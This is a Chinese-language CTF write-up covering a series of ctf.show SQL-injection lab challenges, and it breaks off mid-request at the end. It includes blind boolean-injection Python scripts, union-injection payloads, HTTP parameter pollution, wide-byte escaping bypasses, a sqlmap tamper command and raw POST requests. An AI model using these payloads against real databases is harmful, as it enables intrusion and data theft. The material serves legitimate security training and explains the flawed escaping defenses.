<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=<span class="number">0</span><span class="string">&quot;||if(ascii(substr((sElect(version())),1,1))&gt;0,1,0)||&quot;</span> 有回显</span><br><span class="line">?<span class="built_in">id</span>=<span class="number">0</span><span class="string">&quot;||if(ascii(substr((sElect(version())),1,1))&lt;0,1,0)||&quot;</span> 无回显</span><br></pre></td></tr></table></figure>

<p>写脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://f4301b5e-9fd1-4fcb-b46a-20176eba89fa.challenge.ctf.show/&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">target = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#payload = f&#x27;?id=0&quot;||if(ascii(substr((sElect(group_concat(table_name))from(information_schema.tables)where(table_schema=\&#x27;ctfshow\&#x27;)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)||&quot;&#x27;</span></span><br><span class="line">        <span class="comment">#payload = f&#x27;?id=0&quot;||if(ascii(substr((sElect(group_concat(column_name))from(information_schema.columns)where(table_name=\&#x27;flags\&#x27;)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)||&quot;&#x27;</span></span><br><span class="line">        payload = <span class="string">f&#x27;?id=0&quot;||if(ascii(substr((sElect(flag4s)from(ctfshow.flags)),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,1,0)||&quot;&#x27;</span></span><br><span class="line">        r = requests.get(url + payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Dumb&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span> :</span><br><span class="line">            tail = mid</span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        target += <span class="built_in">chr</span>(head)</span><br><span class="line">        <span class="built_in">print</span>(target)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(target)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我发现union和select的一些大小写格式也是被过滤的</p>
<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">union</span> <span class="built_in">Union</span> <span class="built_in">UNION</span> <span class="built_in">select</span> <span class="built_in">Select</span> <span class="built_in">SELECT</span></span><br></pre></td></tr></table></figure>

<h2 id="web547-548"><a href="#web547-548" class="headerlink" title="web547&amp;548"></a>web547&amp;548</h2><h3 id="单引号-括号增加过滤union和select"><a href="#单引号-括号增加过滤union和select" class="headerlink" title="#单引号+括号增加过滤union和select"></a>#单引号+括号增加过滤union和select</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=0<span class="string">&#x27;)||0||(&#x27;</span> 无回显</span><br><span class="line">?<span class="built_in">id</span>=0<span class="string">&#x27;)||1||(&#x27;</span> 有回显</span><br></pre></td></tr></table></figure>

<p>这道题也不能用报错注入</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://30af16dd-d082-4c7d-9485-b4b0acbc4aec.challenge.ctf.show/&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">target = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#payload = f&quot;?id=0&#x27;)||if(ascii(substr((sElect(group_concat(table_name))from(information_schema.tables)where(table_schema=&#x27;ctfshow&#x27;)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)||(&#x27;&quot;</span></span><br><span class="line">        <span class="comment">#payload = f&quot;?id=0&#x27;)||if(ascii(substr((sElect(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;flags&#x27;)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)||(&#x27;&quot;</span></span><br><span class="line">        payload = <span class="string">f&quot;?id=0&#x27;)||if(ascii(substr((sElect(flag4s)from(ctfshow.flags)),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,1,0)||(&#x27;&quot;</span></span><br><span class="line">        r = requests.get(url + payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Dumb&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span> :</span><br><span class="line">            tail = mid</span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        target += <span class="built_in">chr</span>(head)</span><br><span class="line">        <span class="built_in">print</span>(target)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(target)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="web549"><a href="#web549" class="headerlink" title="web549"></a>web549</h2><h3 id="单引号-Http参数污染"><a href="#单引号-Http参数污染" class="headerlink" title="#单引号+Http参数污染"></a>#单引号+Http参数污染</h3><p>这道题的话其实没怎么看懂，好像只能输入数字？</p>
<p>其实就是两层服务器，具体架构如下</p>
<p><img src="/../image/achieve/202411/sqli-labs/image-20250605105502016.png" alt="image-20250605105502016"></p>
<p>一层服务器也就是tomcat的jsp型服务器负责对传入数据进行过滤和处理，就相当于WAF（Web应用防火墙）</p>
<p>然后真正处理查询语句的服务器是apache的php服务器，但是测试发现我们传入一个参数的话他会检测参数的内容是否为数字，但是如果我们同时传入两个参数的话Apache PHP 会解析最后一个参数，Tomcat JSP 会解析第一个参数，所以我们可以利用第二个参数进行注入</p>
<p>deepseek给了一个很好的参数处理流程图</p>
<p><img src="/../image/achieve/202411/sqli-labs/image-20250605105758882.png" alt="image-20250605105758882"></p>
<p>然后我们测试一下</p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=<span class="number">1</span>&amp;<span class="built_in">id</span>=<span class="number">2</span></span><br></pre></td></tr></table></figure>

<p>成功返回id为2的数据结果，所以真正被执行的是第二个参数</p>
<p>后面的话直接打联合注入就行</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span>&amp;id=<span class="number">-1</span><span class="string">&#x27; union select 1,2,3--+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=1&amp;id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span> group_concat(<span class="built_in">table_name</span>)<span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_schema=<span class="string">&#x27;ctfshow&#x27;</span>)<span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">?id=<span class="number">1</span>&amp;id=<span class="number">-1</span><span class="string">&#x27; union select 1,2,(select group_concat(column_name)from information_schema.columns where table_name=&#x27;</span>flags<span class="string">&#x27;)--+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=1&amp;id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span> flag4s <span class="keyword">from</span> ctfshow.flags)<span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<h2 id="web550"><a href="#web550" class="headerlink" title="web550"></a>web550</h2><h3 id="双引号-Http参数污染"><a href="#双引号-Http参数污染" class="headerlink" title="#双引号+Http参数污染"></a>#双引号+Http参数污染</h3><p>和上一题是一样的，不过闭合方式变成了双引号闭合</p>
<h2 id="web551"><a href="#web551" class="headerlink" title="web551"></a>web551</h2><h3 id="双引号括号-Http参数污染"><a href="#双引号括号-Http参数污染" class="headerlink" title="#双引号括号+Http参数污染"></a>#双引号括号+Http参数污染</h3><p>和上一题是一样的，不过闭合方式变成了双引号括号闭合</p>
<h2 id="web552"><a href="#web552" class="headerlink" title="web552"></a>web552</h2><h3 id="单引号宽字节注入1"><a href="#单引号宽字节注入1" class="headerlink" title="#单引号宽字节注入1"></a>#单引号宽字节注入1</h3><p>这里有对传入值的预处理，假如我们传入<code>1&#39;</code></p>
<p><img src="/../image/achieve/202411/sqli-labs/image-20250605110119877.png" alt="image-20250605110119877"></p>
<p>可以看到返回的值的单引号被转义了，并且还返回了十六进制字符串的结果，既然被转义的话，那我们看看是否能将单引号转义呢</p>
<p><code>%df&#39;</code>&#x3D;&gt;<code>%df\&#39;</code>（单引号会被加上转义字符\）</p>
<p><code>%df\&#39;</code>&#x3D;&gt;<code>%df%5c&#39;</code>（\的十六进制为%5c）</p>
<p><code>%df%5c&#39;</code>&#x3D;&gt;<code>縗&#39;</code>（GBK编码时会认为这时一个宽字节）</p>
<p>这样就会使得单引号被逃逸出去</p>
<p>试一下</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">id</span>=%df&#x27; 出现报错</span><br><span class="line">?<span class="attribute">id</span>=%df&#x27;or 1--+</span><br></pre></td></tr></table></figure>

<p>发现成功回显，那我们正常打注入</p>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id=%df<span class="symbol">&#x27;union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">--+</span></span><br><span class="line">?id=%df<span class="symbol">&#x27;union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span> group_concat(table_name)from information_schema.tables)<span class="comment">--+</span></span><br><span class="line">?id=%df<span class="symbol">&#x27;union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span> group_concat(column_name)from information_schema.columns)<span class="comment">--+</span></span><br><span class="line">?id=%df<span class="symbol">&#x27;union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span> flag4s from ctfshow.flags)<span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p>查表时没法用where table_schema&#x3D;’ctfshow’里面有<code>&#39;</code>，但是因为前面的字符串逃逸了，后面的%df可能被认为是字符串包裹的一部分？这里逃不过去</p>
<p>sqlmap中同时也存在宽字节绕过的脚本unmagicquotes.py</p>
<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;ip&quot;</span> <span class="params">--tamper=</span><span class="string">&quot;unmagicquotes.py&quot;</span> <span class="params">--batch</span></span><br></pre></td></tr></table></figure>

<h2 id="web553"><a href="#web553" class="headerlink" title="web553"></a>web553</h2><h3 id="addslashes宽字节GET"><a href="#addslashes宽字节GET" class="headerlink" title="#addslashes宽字节GET"></a>#addslashes宽字节GET</h3><p>这道题其实和上一题是一样的，只不过防御手法的实现不一样</p>
<p>web552的防御手法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]))</span><br><span class="line"><span class="variable">$id</span>=<span class="title function_ invoke__">check_addslashes</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在&#x27; &quot; \ 等敏感字符前面添加反斜杠</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_addslashes</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;        <span class="comment"># \ 转换为 \\</span></span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/&#x27;</span>. <span class="title function_ invoke__">preg_quote</span>(<span class="string">&#x27;\\&#x27;</span>) .<span class="string">&#x27;/&#x27;</span>, <span class="string">&quot;\\\\\\&quot;</span>, <span class="variable">$string</span>);          将       <span class="comment"># 将 &#x27; 转为\&quot;</span></span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/\&#x27;/i&#x27;</span>, <span class="string">&#x27;\\\&#x27;&#x27;</span>, <span class="variable">$string</span>);   </span><br><span class="line">      <span class="comment"># 将 &quot; 转为\&quot;</span></span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/\&quot;/&#x27;</span>, <span class="string">&quot;\\\&quot;&quot;</span>, <span class="variable">$string</span>);                                </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$string</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>web553的防御手法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_addslashes</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$string</span>= <span class="title function_ invoke__">addslashes</span>(<span class="variable">$string</span>);    </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$string</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>addslashes()</code> 函数返回在预定义字符之前添加反斜杠的字符串。</p>
<table>
<thead>
<tr>
<th>预定义字符</th>
<th>转义后</th>
</tr>
</thead>
<tbody><tr>
<td><code>\</code></td>
<td><code>\\</code></td>
</tr>
<tr>
<td><code>&#39;</code></td>
<td><code>\&#39;</code></td>
</tr>
<tr>
<td><code>&quot;</code></td>
<td><code>\&quot;</code></td>
</tr>
</tbody></table>
<p>本质上这两个函数都是一样的，不过一个是自定义的一个是自带的</p>
<p><strong>Notice</strong>：使用addslashes(),我们需要将 mysql_query 设置为binary的方式，才能防御此漏洞。</p>
<h2 id="web554"><a href="#web554" class="headerlink" title="web554"></a>web554</h2><h3 id="addslashes宽字节POST"><a href="#addslashes宽字节POST" class="headerlink" title="#addslashes宽字节POST"></a>#addslashes宽字节POST</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$uname</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$uname1</span>);</span><br><span class="line"><span class="variable">$passwd</span>= <span class="title function_ invoke__">addslashes</span>(<span class="variable">$passwd1</span>);</span><br></pre></td></tr></table></figure>

<p>过滤方法是一样的，所以两个都可以注入</p>
<p>在Mysql注入天书中提到：在Post请求中，此处介绍一个新方法：将utf-8转换为 utf-16 或 utf-32，例如将 ‘ 转为utf-16的 �’ 。这里的�是有由类似%%%的东西组成的，然后再加上 ‘ (即%27)，然后相当于urlencode后类似 %EF%BF%%BD%27 的东西，然后是宽字符漏铜，%EF%BF会组成一个中文字符，而%BD%27也会被当成中文字符，然后php不会进行转义。然后语句流到mysql的时候，Mysql会将三个%转为一个中文字符，然后剩下%27作为引号，以此进行注入。</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">uname</span>=�&#x27; <span class="keyword">or</span> 1--+&amp;<span class="attribute">passwd</span>=1</span><br></pre></td></tr></table></figure>

<p>不知道为啥这里在页面传参没回显但是在yakit抓包传参就可以</p>
<p><img src="/../image/achieve/202411/sqli-labs/image-20250605121347058.png" alt="image-20250605121347058"></p>
<p>最后的请求包</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>b29ea5fa-d85c-4667-98a6-0249a32a933a.challenge.ctf.show</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>30</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">sec-ch-ua</span><span class="punctuation">: </span>&quot;Google Chrome&quot;;v=&quot;137&quot;, &quot;Chromium&quot;;v=&quot;137&quot;, &quot;Not/A)Brand&quot;;v=&quot;24&quot;</span><br><span class="line"><span class="attribute">sec-ch-ua-mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">sec-ch-ua-platform</span><span class="punctuation">: </span>&quot;Windows&quot;</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>https://b29ea5fa-d85c-4667-98a6-0249a32a933a.challenge.ctf.show</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>same-origin</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span><span class="punctuation">: </span>?1</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>document</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>https://b29ea5fa-d85c-4667-98a6-0249a32a933a.challenge.ctf.show/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br, zstd</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>cf_clearance=ZuK66QChNGftyyiGS39xGqXjRvrgqwc7dpOpwNp8hgY-1747317016-1.2.1.1-SHtYMtmhonoQh3f9JFLxlX5e8ZPl2H.d.1t6d9JUkU8A48zWJ8kwl3L9eAExpcFayYenFfR8OxZ7NWlafUA3eW..1Ql.yEeMVQsO2dN0LeOWb9v9mBTw9f9lNiJBsuz0wNfBuxQoVypAzPhH9KeUpkB22hemlwS35.DR.pfloutzMUBCc7K.SMPWBv0hD22WPrXL6TOwx.8Vlv0exiJGfJydMDF8Fmgi7BwFDHfm8A27bqv1xzCh1xdEneeUo.dok_1cBQWYDpbP2ClHu0miDKBW2hnvhGXG7HbMovGYSE3c1QFXa0TPiCQYSEXDX_10Bnlxz9QrXZujCxO7ZGcQA_vDxzoYodJRpDZrLpAsbq8</span><br><span class="line"></span><br><span class="line"><span class="language-routeros"><span class="attribute">uname</span>=%df&#x27;union select 1,(select flag4s <span class="keyword">from</span> ctfshow.flags)--+&amp;<span class="attribute">passwd</span>=1&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>

<h2 id="web555"><a href="#web555" class="headerlink" title="web555"></a>web555</h2><h3 id="数字型的注入"><a href="#数字型的注入" class="headerlink" title="#数字型的注入"></a>#数字型的注入</h3><p>这次虽然转义了，但是不影响我们数字型的注入</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">id</span>=0 <span class="keyword">or</span> <span class="attribute">1</span>=1</span><br></pre></td></tr></table></figure>

<p>然后直接打就行</p>
<figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">0</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span> flag4s <span class="keyword">from</span> ctfshow.flags)</span><br></pre></td></tr></table></figure>

<p>如果在查询语句中需要用到引号利用指明数据库名或表名的话，可以用子查询语句表示字符串</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(<span class="built_in">table_name</span>) <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_schema=(<span class="keyword">select</span> <span class="built_in">schema_name</span> <span class="keyword">from</span> information_schema.schemata <span class="keyword">limit</span> <span class="number">1</span>))</span><br></pre></td></tr></table></figure>

<p>通过limit限制查询内容，从而拿到我们需要的数据作为字符串去查询</p>
<h2 id="web556"><a href="#web556" class="headerlink" title="web556"></a>web556</h2><h3 id="mysql-real-escape-string宽字节GET"><a href="#mysql-real-escape-string宽字节GET" class="headerlink" title="#mysql_real_escape_string宽字节GET"></a>#mysql_real_escape_string宽字节GET</h3><p>这次的话检测函数换成了mysql_real_escape_string</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span>=<span class="title function_ invoke__">check_quotes</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_quotes</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$string</span>= <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$string</span>);    </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$string</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>mysql_real_escape_string 会检测并转义如下危险字符：</p>
<table>
<thead>
<tr>
<th>危险字符</th>
<th>转义后</th>
</tr>
</thead>
<tbody><tr>
<td><code>\</code></td>
<td><code>\\</code></td>
</tr>
<tr>
<td><code>&#39;</code></td>
<td><code>\&#39;</code></td>
</tr>
<tr>
<td><code>&quot;</code></td>
<td><code>\&quot;</code></td>
</tr>
</tbody></table>
<p>正常注入就行</p>
<figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">-1</span>%df&#x27; <span class="built_in">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span> group_concat(table_name)<span class="keyword">from</span> information_schema.<span class="built_in">tables</span> <span class="built_in">where</span> table_schema=(<span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata limit <span class="number">1</span>))--+</span><br><span class="line"></span><br><span class="line">?id=<span class="number">-1</span>%df&#x27; <span class="built_in">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span> group_concat(column_name)<span class="keyword">from</span> information_schema.columns <span class="built_in">where</span> table_name=(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.<span class="built_in">tables</span> limit <span class="number">1</span>))--+</span><br><span class="line"></span><br><span class="line">?id=<span class="number">-1</span>%df&#x27; <span class="built_in">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span> flag4s <span class="keyword">from</span> ctfshow.flags)--+</span><br></pre></td></tr></table></figure>

<h2 id="web557"><a href="#web557" class="headerlink" title="web557"></a>web557</h2><h3 id="mysql-real-escape-string宽字节POST"><a href="#mysql-real-escape-string宽字节POST" class="headerlink" title="#mysql_real_escape_string宽字节POST"></a>#mysql_real_escape_string宽字节POST</h3><p>和556一样的函数处理，但是换成了POST传参，用yakit发包</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/<span class="number">1.1</span></span><br><span class="line">Host: bbd41d07-<span class="number">549</span>c-<span class="number">4094</span>-b38a-fb8c3a7589c3.challenge.ctf.show</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Length: <span class="number">37</span></span><br><span class="line">Cache-Control: max-age=<span class="number">0</span></span><br><span class="line">sec-ch-ua: <span class="string">&quot;Google Chrome&quot;</span>;v=<span class="string">&quot;137&quot;</span>, <span class="string">&quot;Chromium&quot;</span>;v=<span class="string">&quot;137&quot;</span>, <span class="string">&quot;Not/A)Brand&quot;</span>;v=<span class="string">&quot;24&quot;</span></span><br><span class="line">sec-ch-ua-mobile: ?<span class="number">0</span></span><br><span class="line">sec-ch-ua-platform: <span class="string">&quot;Windows&quot;</span></span><br><span class="line">Origin: https:<span class="comment">//bbd41d07-549c-4094-b38a-fb8c3a7589c3.challenge.ctf.show</span></span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">137.0</span>.<span class="number">0.0</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span><br><span class="line"><span class="comment">Sec-Fetch-Site: same-origin</span></span><br><span class="line"><span class="comment">Sec-Fetch-Mode: navigate</span></span><br><span class="line"><span class="comment">Sec-Fetch-User: ?1</span></span><br><span class="line"><span 